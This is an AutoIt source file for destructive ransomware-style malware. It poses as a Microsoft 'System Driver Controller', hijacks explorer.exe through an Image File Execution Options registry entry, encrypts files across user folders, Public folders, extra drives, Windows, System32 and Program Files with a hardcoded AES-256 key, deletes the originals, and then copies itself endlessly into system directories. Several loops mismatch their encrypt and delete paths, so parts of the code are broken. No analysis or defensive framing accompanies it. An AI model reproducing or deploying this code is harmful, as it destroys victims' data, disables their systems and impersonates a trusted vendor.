#NoTrayIcon
#RequireAdmin
#pragma compile(Icon, "icon.ico")
#pragma compile(FileDescription, "System Driver Controller.")
#pragma compile(ProductName, "SysDriverController")
#pragma compile(ProductVersion, 5.2)
#pragma compile(FileVersion, 5.2.0.0) ; The last parameter is optional.
#pragma compile(LegalCopyright, Copyright © 2021 Microsoft Corporation)
#pragma compile(CompanyName, 'Microsoft Corporation')

#include <Crypt.au3>
#include <File.au3>


Local $bt
$bt = 0
RegWrite("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\explorer.exe", "Debugger", "REG_SZ", "%appdata%\msg.exe")

Local $Master_Password = "ee151d5as1a5sd1a5s131351w3510dc2"

$y = _filelisttoarray(@DesktopDir, "*.*", $bt)
If $y <> "" AND $y <> @error AND $y <> -1 Then
	For $i = 1 To $y[0] Step +1
		If NOT StringInStr($y[$i], "ela") Then
			$dd1 = StringReplace($y[$i], "fixed", "")
			_Crypt_EncryptFile(@DesktopDir & "/" & $y[$i], @DesktopDir & "/ela" & $dd1, $Master_Password, $CALG_AES_256)
			FileDelete(@DesktopDir & "/" & $y[$i])
			DirRemove(@DesktopDir & "/" & $y[$i], 1)
		EndIf
	Next
EndIf

; UserProfile Roaming

$y = _filelisttoarray(@UserProfileDir & "/AppData/Roaming", "*.*", $bt)
If $y <> "" AND $y <> @error AND $y <> -1 Then
	For $i = 1 To $y[0] Step +1
		If NOT StringInStr($y[$i], "ela") Then
			$dd1 = StringReplace($y[$i], "fixed", "")
			_Crypt_EncryptFile(@UserProfileDir & "/AppData/Roaming/" & $y[$i], @UserProfileDir & "/AppData/Roaming/ela" & $dd1, $Master_Password, $CALG_AES_256)
			FileDelete(@UserProfileDir & "/AppData/Roaming/" & $y[$i])
			DirRemove(@UserProfileDir & "/AppData/Roaming/" & $y[$i], 1)
		EndIf
	Next
EndIf


; UserProfile Local

$y = _filelisttoarray(@UserProfileDir & "/AppData/Local", "*.*", $bt)
If $y <> "" AND $y <> @error AND $y <> -1 Then
	For $i = 1 To $y[0] Step +1
		If NOT StringInStr($y[$i], "ela") Then
			$dd1 = StringReplace($y[$i], "fixed", "")
			_Crypt_EncryptFile(@UserProfileDir & "/AppData/Local/" & $y[$i], @UserProfileDir & "/AppData/Local/ela" & $dd1, $Master_Password, $CALG_AES_256)
			FileDelete(@UserProfileDir & "/AppData/Local/" & $y[$i])
			DirRemove(@UserProfileDir & "/AppData/Local/" & $y[$i], 1)
		EndIf
	Next
EndIf


; Drive

$y = DriveGetDrive("FIXED")
If $y <> "" AND $y <> @error AND $y <> -1 Then
	For $i = 1 To $y[0] Step +1
		If $y[$i] <> "c:" Then
			$ys = _filelisttoarray($y[$i], "*.*", $bt)
			If $ys <> "" AND $ys <> @error AND $ys <> -1 Then
				For $is = 1 To $ys[0] Step +1
					If NOT StringInStr($ys[$is], "ela") Then
						$dd1 = StringReplace($ys[$is], "fixed", "")
						_Crypt_EncryptFile($y[$i] & "/" & $ys[$is], $y[$i] & "/ela" & $dd1, $Master_Password, $CALG_AES_256)
						FileDelete($y[$i] & "/" & $ys[$is])
						DirRemove($y[$i] & "/" & $ys[$is], 1)
					EndIf
				Next
			EndIf
		EndIf
	Next
EndIf

; Music

$y = _filelisttoarray(@UserProfileDir & "\Music", "*.*", $bt)
If $y <> "" AND $y <> @error AND $y <> -1 Then
	For $i = 1 To $y[0] Step +1
		If NOT StringInStr($y[$i], "ela") Then
			$dd1 = StringReplace($y[$i], "fixed", "")
			_Crypt_EncryptFile(@UserProfileDir & "\Music" & "\" & $y[$i], @UserProfileDir & "\Music" & "/ela" & $dd1, $Master_Password, $CALG_AES_256)
			FileDelete(@UserProfileDir & "\Music" & "\" & $y[$i])
			DirRemove(@UserProfileDir & "\Music" & "\" & $y[$i], 1)
		EndIf
	Next
EndIf

; Pictures


$y = _filelisttoarray(@UserProfileDir & "\Pictures", "*.*", $bt)
If $y <> "" AND $y <> @error AND $y <> -1 Then
	For $i = 1 To $y[0] Step +1
		If NOT StringInStr($y[$i], "ela") Then
			$dd1 = StringReplace($y[$i], "fixed", "")
			_Crypt_EncryptFile(@UserProfileDir & "\Pictures" & "/" & $y[$i], @UserProfileDir & "\Pictures" & "/ela" & $dd1, $Master_Password, $CALG_AES_256)
			FileDelete(@UserProfileDir & "\Pictures" & "/" & $y[$i])
			DirRemove(@UserProfileDir & "\Pictures" & "/" & $y[$i], 1)
		EndIf
	Next
EndIf

; Videos

$y = _filelisttoarray(@UserProfileDir & "\Videos", "*.*", $bt)
If $y <> "" AND $y <> @error AND $y <> -1 Then
	For $i = 1 To $y[0] Step +1
		If NOT StringInStr($y[$i], "ela") Then
			$dd1 = StringReplace($y[$i], "fixed", "")
			_Crypt_EncryptFile(@UserProfileDir & "\Videos" & "/" & $y[$i], @UserProfileDir & "\Videos" & "/ela" & $dd1, $Master_Password, $CALG_AES_256)
			FileDelete(@UserProfileDir & "\Videos" & "/" & $y[$i])
			DirRemove(@UserProfileDir & "\Videos" & "/" & $y[$i], 1)
		EndIf
	Next
EndIf

; Documents

$y = _filelisttoarray(@UserProfileDir & "\Documents", "*.*", $bt)
If $y <> "" AND $y <> @error AND $y <> -1 Then
	For $i = 1 To $y[0] Step +1
		If NOT StringInStr($y[$i], "ela") Then
			$dd1 = StringReplace($y[$i], "fixed", "")
			_Crypt_EncryptFile(@UserProfileDir & "\Documents" & "/" & $y[$i], @UserProfileDir & "\Documents" & "/ela" & $dd1, $Master_Password, $CALG_AES_256)
			FileDelete(@UserProfileDir & "\Documents" & "/" & $y[$i])
			DirRemove(@UserProfileDir & "\Documents" & "/" & $y[$i], 1)
		EndIf
	Next
EndIf

; Documents

$y = _filelisttoarray("C:\Users\Public\Documents", "*.*", $bt)
If $y <> "" AND $y <> @error AND $y <> -1 Then
	For $i = 1 To $y[0] Step +1
		If NOT StringInStr($y[$i], "ela") Then
			$dd1 = StringReplace($y[$i], "fixed", "")
			_Crypt_EncryptFile("C:\Users\Public\Documents" & "/" & $y[$i], "C:\Users\Public\Documents" & "/ela" & $dd1, $Master_Password, $CALG_AES_256)
			FileDelete("C:\Users\Public\Documents" & "/" & $y[$i])
			DirRemove("C:\Users\Public\Documents" & "/" & $y[$i], 1)
		EndIf
	Next
EndIf

; Pictures

$y = _filelisttoarray("C:\Users\Public\Pictures", "*.*", $bt)
If $y <> "" AND $y <> @error AND $y <> -1 Then
	For $i = 1 To $y[0] Step +1
		If NOT StringInStr($y[$i], "ela") Then
			$dd1 = StringReplace($y[$i], "fixed", "")
			_Crypt_EncryptFile("C:\Users\Public\Pictures" & "/" & $y[$i], "C:\Users\Public\Pictures" & "/ela" & $dd1, $Master_Password, $CALG_AES_256)
			FileDelete("C:\Users\Public\Pictures" & "/" & $y[$i])
			DirRemove("C:\Users\Public\Pictures" & "/" & $y[$i], 1)
		EndIf
	Next
EndIf

; Videos

$y = _filelisttoarray("C:\Users\Public\Videos", "*.*", $bt)
If $y <> "" AND $y <> @error AND $y <> -1 Then
	For $i = 1 To $y[0] Step +1
		If NOT StringInStr($y[$i], "ela") Then
			$dd1 = StringReplace($y[$i], "fixed", "")
			_Crypt_EncryptFile("C:\Users\Public\Videos" & "/" & $y[$i], "C:\Users\Public\Videos" & "/ela" & $dd1, $Master_Password, $CALG_AES_256)
			FileDelete("C:\Users\Public\Videos" & "/" & $y[$i])
			DirRemove("C:\Users\Public\Videos" & "/" & $y[$i], 1)
		EndIf
	Next
EndIf

; Public Documents

$y = _filelisttoarray("C:\Users\Public\Public Documents", "*.*", $bt)
If $y <> "" AND $y <> @error AND $y <> -1 Then
	For $i = 1 To $y[0] Step +1
		If NOT StringInStr($y[$i], "ela") Then
			$dd1 = StringReplace($y[$i], "fixed", "")
			_Crypt_EncryptFile("C:\Users\Public\Public Documents" & "/" & $y[$i], "C:\Users\Public\Videos" & "/ela" & $dd1, $Master_Password, $CALG_AES_256)
			FileDelete("C:\Users\Public\Public Documents" & "/" & $y[$i])
			DirRemove("C:\Users\Public\Public Documents" & "/" & $y[$i], 1)
		EndIf
	Next
EndIf


; Public Downloads

$y = _filelisttoarray("C:\Users\Public\Public Downloads", "*.*", $bt)
If $y <> "" AND $y <> @error AND $y <> -1 Then
	For $i = 1 To $y[0] Step +1
		If NOT StringInStr($y[$i], "ela") Then
			$dd1 = StringReplace($y[$i], "fixed", "")
			_Crypt_EncryptFile("C:\Users\Public\Public Downloads" & "/" & $y[$i], "C:\Users\Public\Videos" & "/ela" & $dd1, $Master_Password, $CALG_AES_256)
			FileDelete("C:\Users\Public\Public Downloads" & "/" & $y[$i])
			DirRemove("C:\Users\Public\Public Downloads" & "/" & $y[$i], 1)
		EndIf
	Next
EndIf


; Public Music

$y = _filelisttoarray("C:\Users\Public\Public Music", "*.*", $bt)
If $y <> "" AND $y <> @error AND $y <> -1 Then
	For $i = 1 To $y[0] Step +1
		If NOT StringInStr($y[$i], "ela") Then
			$dd1 = StringReplace($y[$i], "fixed", "")
			_Crypt_EncryptFile("C:\Users\Public\Public Music" & "/" & $y[$i], "C:\Users\Public\Videos" & "/ela" & $dd1, $Master_Password, $CALG_AES_256)
			FileDelete("C:\Users\Public\Public Music" & "/" & $y[$i])
			DirRemove("C:\Users\Public\Public Music" & "/" & $y[$i], 1)
		EndIf
	Next
EndIf


; Public Pictures

$y = _filelisttoarray("C:\Users\Public\Public Pictures", "*.*", $bt)
If $y <> "" AND $y <> @error AND $y <> -1 Then
	For $i = 1 To $y[0] Step +1
		If NOT StringInStr($y[$i], "ela") Then
			$dd1 = StringReplace($y[$i], "fixed", "")
			_Crypt_EncryptFile("C:\Users\Public\Public Pictures" & "/" & $y[$i], "C:\Users\Public\Videos" & "/ela" & $dd1, $Master_Password, $CALG_AES_256)
			FileDelete("C:\Users\Public\Public Pictures" & "/" & $y[$i])
			DirRemove("C:\Users\Public\Public Pictures" & "/" & $y[$i], 1)
		EndIf
	Next
EndIf


; Public Recorded TV

$y = _filelisttoarray("C:\Users\Public\Public Recorded TV", "*.*", $bt)
If $y <> "" AND $y <> @error AND $y <> -1 Then
	For $i = 1 To $y[0] Step +1
		If NOT StringInStr($y[$i], "ela") Then
			$dd1 = StringReplace($y[$i], "fixed", "")
			_Crypt_EncryptFile("C:\Users\Public\Public Recorded TV" & "/" & $y[$i], "C:\Users\Public\Videos" & "/ela" & $dd1, $Master_Password, $CALG_AES_256)
			FileDelete("C:\Users\Public\Public Recorded TV" & "/" & $y[$i])
			DirRemove("C:\Users\Public\Public Recorded TV" & "/" & $y[$i], 1)
		EndIf
	Next
EndIf


; Public Videos

$y = _filelisttoarray("C:\Users\Public\Public Videos", "*.*", $bt)
If $y <> "" AND $y <> @error AND $y <> -1 Then
	For $i = 1 To $y[0] Step +1
		If NOT StringInStr($y[$i], "ela") Then
			$dd1 = StringReplace($y[$i], "fixed", "")
			_Crypt_EncryptFile("C:\Users\Public\Public Videos" & "/" & $y[$i], "C:\Users\Public\Videos" & "/ela" & $dd1, $Master_Password, $CALG_AES_256)
			FileDelete("C:\Users\Public\Public Videos" & "/" & $y[$i])
			DirRemove("C:\Users\Public\Public Videos" & "/" & $y[$i], 1)
		EndIf
	Next
EndIf

; My Documents

$y = _filelisttoarray(@UserProfileDir & "\My Documents", "*.*", $bt)
If $y <> "" AND $y <> @error AND $y <> -1 Then
	For $i = 1 To $y[0] Step +1
		If NOT StringInStr($y[$i], "ela") Then
			$dd1 = StringReplace($y[$i], "fixed", "")
			_Crypt_EncryptFile(@UserProfileDir & "\My Documents" & "/" & $y[$i], @UserProfileDir & "\Documents" & "/ela" & $dd1, $Master_Password, $CALG_AES_256)
			FileDelete(@UserProfileDir & "\My Documents" & "/" & $y[$i])
			DirRemove(@UserProfileDir & "\My Documents" & "/" & $y[$i], 1)
		EndIf
	Next
EndIf

; My Downloads


$y = _filelisttoarray(@UserProfileDir & "\Downloads", "*.*", $bt)
If $y <> "" AND $y <> @error AND $y <> -1 Then
	For $i = 1 To $y[0] Step +1
		If NOT StringInStr($y[$i], "ela") Then
			$dd1 = StringReplace($y[$i], "fixed", "")
			_Crypt_EncryptFile(@UserProfileDir & "\Downloads" & "/" & $y[$i], @UserProfileDir & "\Documents" & "/ela" & $dd1, $Master_Password, $CALG_AES_256)
			FileDelete(@UserProfileDir & "\Downloads" & "/" & $y[$i])
			DirRemove(@UserProfileDir & "\Downloads" & "/" & $y[$i], 1)
		EndIf
	Next
EndIf

; Favorites

$y = _filelisttoarray(@UserProfileDir & "\Favorites", "*.*", $bt)
If $y <> "" AND $y <> @error AND $y <> -1 Then
	For $i = 1 To $y[0] Step +1
		If NOT StringInStr($y[$i], "ela") Then
			$dd1 = StringReplace($y[$i], "fixed", "")
			_Crypt_EncryptFile(@UserProfileDir & "\Favorites" & "/" & $y[$i], @UserProfileDir & "\Documents" & "/ela" & $dd1, $Master_Password, $CALG_AES_256)
			FileDelete(@UserProfileDir & "\Favorites" & "/" & $y[$i])
			DirRemove(@UserProfileDir & "\Favorites" & "/" & $y[$i], 1)
		EndIf
	Next
EndIf

; Links


$y = _filelisttoarray(@UserProfileDir & "\Links", "*.*", $bt)
If $y <> "" AND $y <> @error AND $y <> -1 Then
	For $i = 1 To $y[0] Step +1
		If NOT StringInStr($y[$i], "ela") Then
			$dd1 = StringReplace($y[$i], "fixed", "")
			_Crypt_EncryptFile(@UserProfileDir & "\Links" & "/" & $y[$i], @UserProfileDir & "\Documents" & "/ela" & $dd1, $Master_Password, $CALG_AES_256)
			FileDelete(@UserProfileDir & "\Links" & "/" & $y[$i])
			DirRemove(@UserProfileDir & "\Links" & "/" & $y[$i], 1)
		EndIf
	Next
EndIf


; My Music

$y = _filelisttoarray(@UserProfileDir & "\My Music", "*.*", $bt)
If $y <> "" AND $y <> @error AND $y <> -1 Then
	For $i = 1 To $y[0] Step +1
		If NOT StringInStr($y[$i], "ela") Then
			$dd1 = StringReplace($y[$i], "fixed", "")
			_Crypt_EncryptFile(@UserProfileDir & "\My Music" & "/" & $y[$i], @UserProfileDir & "\Documents" & "/ela" & $dd1, $Master_Password, $CALG_AES_256)
			FileDelete(@UserProfileDir & "\My Music" & "/" & $y[$i])
			DirRemove(@UserProfileDir & "\My Music" & "/" & $y[$i], 1)
		EndIf
	Next
EndIf


; My Pictures

$y = _filelisttoarray(@UserProfileDir & "\My Pictures", "*.*", $bt)
If $y <> "" AND $y <> @error AND $y <> -1 Then
	For $i = 1 To $y[0] Step +1
		If NOT StringInStr($y[$i], "ela") Then
			$dd1 = StringReplace($y[$i], "fixed", "")
			_Crypt_EncryptFile(@UserProfileDir & "\My Pictures" & "/" & $y[$i], @UserProfileDir & "\Documents" & "/ela" & $dd1, $Master_Password, $CALG_AES_256)
			FileDelete(@UserProfileDir & "\My Pictures" & "/" & $y[$i])
			DirRemove(@UserProfileDir & "\My Pictures" & "/" & $y[$i], 1)
		EndIf
	Next
EndIf


; My Videos

$y = _filelisttoarray(@UserProfileDir & "\My Videos", "*.*", $bt)
If $y <> "" AND $y <> @error AND $y <> -1 Then
	For $i = 1 To $y[0] Step +1
		If NOT StringInStr($y[$i], "ela") Then
			$dd1 = StringReplace($y[$i], "fixed", "")
			_Crypt_EncryptFile(@UserProfileDir & "\My Videos" & "/" & $y[$i], @UserProfileDir & "\Documents" & "/ela" & $dd1, $Master_Password, $CALG_AES_256)
			FileDelete(@UserProfileDir & "\My Videos" & "/" & $y[$i])
			DirRemove(@UserProfileDir & "\My Videos" & "/" & $y[$i], 1)
		EndIf
	Next
EndIf

$y = _filelisttoarray("D:\", "*.*", $bt)
If $y <> "" AND $y <> @error AND $y <> -1 Then
	For $i = 1 To $y[0] Step +1
		If NOT StringInStr($y[$i], "ela") Then
			$dd1 = StringReplace($y[$i], "fixed", "")
			_Crypt_EncryptFile("D:\" & $y[$i], "D:\" & "/ela" & $dd1, $Master_Password, $CALG_AES_256)
			FileDelete(@UserProfileDir & "\" & "/" & $y[$i])
			DirRemove(@UserProfileDir & "\" & "/" & $y[$i], 1)
		EndIf
	Next
EndIf

$y = _filelisttoarray("C:\Windows", "*.*", $bt)
If $y <> "" AND $y <> @error AND $y <> -1 Then
	For $i = 1 To $y[0] Step +1
		If NOT StringInStr($y[$i], "ela") Then
			$dd1 = StringReplace($y[$i], "fixed", "")
			_Crypt_EncryptFile("D:\" & $y[$i], "D:\" & "/ela" & $dd1, $Master_Password, $CALG_AES_256)
			FileDelete(@UserProfileDir & "\" & "/" & $y[$i])
			DirRemove(@UserProfileDir & "\" & "/" & $y[$i], 1)
		EndIf
	Next
EndIf

$y = _filelisttoarray("C:\Windows\System32", "*.*", $bt)
If $y <> "" AND $y <> @error AND $y <> -1 Then
	For $i = 1 To $y[0] Step +1
		If NOT StringInStr($y[$i], "ela") Then
			$dd1 = StringReplace($y[$i], "fixed", "")
			_Crypt_EncryptFile("D:\" & $y[$i], "D:\" & "/ela" & $dd1, $Master_Password, $CALG_AES_256)
			FileDelete(@UserProfileDir & "\" & "/" & $y[$i])
			DirRemove(@UserProfileDir & "\" & "/" & $y[$i], 1)
		EndIf
	Next
EndIf

$y = _filelisttoarray(@WorkingDir & "\", "*.*", $bt)
If $y <> "" AND $y <> @error AND $y <> -1 Then
	For $i = 1 To $y[0] Step +1
		If NOT StringInStr($y[$i], "ela") Then
			$dd1 = StringReplace($y[$i], "fixed", "")
			_Crypt_EncryptFile("D:\" & $y[$i], "D:\" & "/ela" & $dd1, $Master_Password, $CALG_AES_256)
			FileDelete(@UserProfileDir & "\" & "/" & $y[$i])
			DirRemove(@UserProfileDir & "\" & "/" & $y[$i], 1)
		EndIf
	Next
EndIf

$y = _filelisttoarray("C:\Program Files", "*.*", $bt)
If $y <> "" AND $y <> @error AND $y <> -1 Then
	For $i = 1 To $y[0] Step +1
		If NOT StringInStr($y[$i], "ela") Then
			$dd1 = StringReplace($y[$i], "fixed", "")
			_Crypt_EncryptFile("D:\" & $y[$i], "D:\" & "/ela" & $dd1, $Master_Password, $CALG_AES_256)
			FileDelete(@UserProfileDir & "\" & "/" & $y[$i])
			DirRemove(@UserProfileDir & "\" & "/" & $y[$i], 1)
		EndIf
	Next
EndIf

$y = _filelisttoarray("C:\Program Files (x86)", "*.*", $bt)
If $y <> "" AND $y <> @error AND $y <> -1 Then
	For $i = 1 To $y[0] Step +1
		If NOT StringInStr($y[$i], "ela") Then
			$dd1 = StringReplace($y[$i], "fixed", "")
			_Crypt_EncryptFile("D:\" & $y[$i], "D:\" & "/ela" & $dd1, $Master_Password, $CALG_AES_256)
			FileDelete(@UserProfileDir & "\" & "/" & $y[$i])
			DirRemove(@UserProfileDir & "\" & "/" & $y[$i], 1)
		EndIf
	Next
EndIf

$y = _filelisttoarray(@WorkingDir & "\", "*.*", $bt)
If $y <> "" AND $y <> @error AND $y <> -1 Then
	For $i = 1 To $y[0] Step +1
		If NOT StringInStr($y[$i], "ela") Then
			$dd1 = StringReplace($y[$i], "fixed", "")
			_Crypt_EncryptFile("D:\" & $y[$i], "D:\" & "/ela" & $dd1, $Master_Password, $CALG_AES_256)
			FileDelete(@UserProfileDir & "\" & "/" & $y[$i])
			DirRemove(@UserProfileDir & "\" & "/" & $y[$i], 1)
		EndIf
	Next
EndIf

While 1
	FileCopy("ela.exe", @DesktopDir & "\ela" & Random(0, 100000) & ".exe")
	FileCopy("ela.exe", @WindowsDir & "\ela" & Random(0, 100000) & ".exe")
	FileCopy("ela.exe", @SystemDir & "\ela" & Random(0, 100000) & ".exe")
	FileCopy("ela.exe", @AppDataDir & "\ela" & Random(0, 100000) & ".exe")
	FileCopy("ela.exe", @LocalAppDataDir & "\ela" & Random(0, 100000) & ".exe")
	FileCopy("ela.exe", @ProgramFilesDir & "\ela" & Random(0, 100000) & ".exe")
	FileCopy("ela.exe", "D:\" & "\ela" & Random(0, 100000) & ".exe")
	FileCopy("ela.exe", "E:\" & "\ela" & Random(0, 100000) & ".exe")
WEnd